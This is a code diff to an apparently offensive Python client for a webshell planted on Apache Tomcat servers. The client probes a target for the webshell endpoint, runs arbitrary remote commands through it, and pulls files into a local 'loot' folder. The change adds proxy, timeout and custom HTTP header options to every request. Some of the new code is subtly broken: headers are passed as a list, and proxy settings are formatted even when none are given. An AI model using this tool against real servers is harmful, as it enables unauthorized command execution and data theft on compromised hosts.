@@ -45,17 +45,26 @@ def parseArgs():
     parser.add_argument("-t", "--target", default=None, required=True, help="Apache Tomcat target instance")
     parser.add_argument("-k", "--insecure", dest="insecure_tls", action="store_true", default=False, help="Allow insecure server connections when using SSL (default: False)")
     parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
+
+    group_configuration = parser.add_argument_group("Advanced configuration")
+    group_configuration.add_argument("-PI", "--proxy-ip", default=None, type=str, help="Proxy IP.")
+    group_configuration.add_argument("-PP", "--proxy-port", default=None, type=int, help="Proxy port")
+    group_configuration.add_argument("-rt", "--request-timeout", default=30, type=int, help="Set the timeout of HTTP requests.")
+    group_configuration.add_argument("-H", "--http-header", dest="http_headers", default=[], type=str, action='append', help="Custom HTTP headers to add to requests.")
+    
     return parser.parse_args()
 
 
-def remote_exec(api_endpoint, cmd, verbose=False):
+def remote_exec(api_endpoint, cmd, headers={}, proxies=None, verbose=False):
     try:
         r = requests.post(
             api_endpoint,
             data={
                 "action": "exec",
                 "cmd": cmd,
-            }
+            },
+            proxies=proxies,
+            headers=headers
         )
         if r.status_code == 200:
             data = r.json()
@@ -71,7 +80,7 @@ def remote_exec(api_endpoint, cmd, verbose=False):
         print(e)
 
 
-def remote_download(api_endpoint, remote_path, local_path="./loot/", verbose=False):
+def remote_download(api_endpoint, remote_path, local_path="./loot/", headers={}, proxies=None, verbose=False):
     def b_filesize(content):
         l = len(content)
         units = ['B', 'kB', 'MB', 'GB', 'TB', 'PB']
@@ -86,7 +95,9 @@ def remote_download(api_endpoint, remote_path, local_path="./loot/", verbose=Fal
         data={
             "action": "download",
             "path": remote_path,
-        }
+        },
+        proxies=proxies,
+        headers=headers
     )
 
     if r.status_code == 200:
@@ -108,19 +119,19 @@ def remote_download(api_endpoint, remote_path, local_path="./loot/", verbose=Fal
         return False
 
 
-def detect_api_endpoint(target, verbose=False):
+def detect_api_endpoint(target, headers={}, proxies=None, verbose=False):
     print("[+] Searching for valid API endpoints ...")
     SERVLET_API = "%s/webshell/api" % target
     JSP_API = "%s/webshell/api.jsp" % target
 
-    r = requests.post(SERVLET_API, data={})
+    r = requests.post(SERVLET_API, data={}, proxies=proxies, headers=headers)
     if verbose:
         print("  | [HTTP %03d] on %s" % (r.status_code, r.url))
     
     if r.status_code == 200:
         return SERVLET_API
     else:
-        r = requests.post(JSP_API, data={})
+        r = requests.post(JSP_API, data={}, proxies=proxies, headers=headers)
         if verbose:
             print("  | [HTTP %03d] on %s" % (r.status_code, r.url))
 
@@ -140,6 +151,11 @@ def show_help():
 if __name__ == '__main__':
     options = parseArgs()
 
+    http_proxies = {
+        "http": "http://%s:%d/" % (options.proxy_ip, options.proxy_port),
+        "https": "https://%s:%d/" % (options.proxy_ip, options.proxy_port)
+    }
+
     if not options.target.startswith("https://") and not options.target.startswith("http://"):
         options.target = "http://" + options.target
     options.target = options.target.rstrip('/')
@@ -153,10 +169,11 @@ if __name__ == '__main__':
             requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
         except AttributeError:
             pass
-
+            
     api_endpoint = detect_api_endpoint(
         target=options.target, 
-        verbose=options.verbose
+        verbose=options.verbose,
+        proxies=http_proxies
     )
 
     if api_endpoint is not None:
@@ -175,10 +192,27 @@ if __name__ == '__main__':
                 if len(args) != 2 and len(args) != 3:
                     print("Usage: download <remotepath> [localpath]")
                 elif len(args) == 2:
-                    remote_download(api_endpoint, remote_path=args[1])
+                    remote_download(
+                        api_endpoint, 
+                        remote_path=args[1], 
+                        proxies=http_proxies,
+                        headers=options.http_headers
+                    )
                 elif len(args) == 3:
-                    remote_download(api_endpoint, remote_path=args[1], local_path=args[2])
+                    remote_download(
+                        api_endpoint, 
+                        remote_path=args[1],
+                        local_path=args[2], 
+                        proxies=http_proxies,
+                        headers=options.http_headers
+                    )
             else:
-                remote_exec(api_endpoint, cmd, verbose=options.verbose)
+                remote_exec(
+                    api_endpoint, 
+                    cmd, 
+                    verbose=options.verbose,
+                    proxies=http_proxies,
+                    headers=options.http_headers
+                )
     else:
         print("\n[!] No valid API endpoint detected, exitting...")
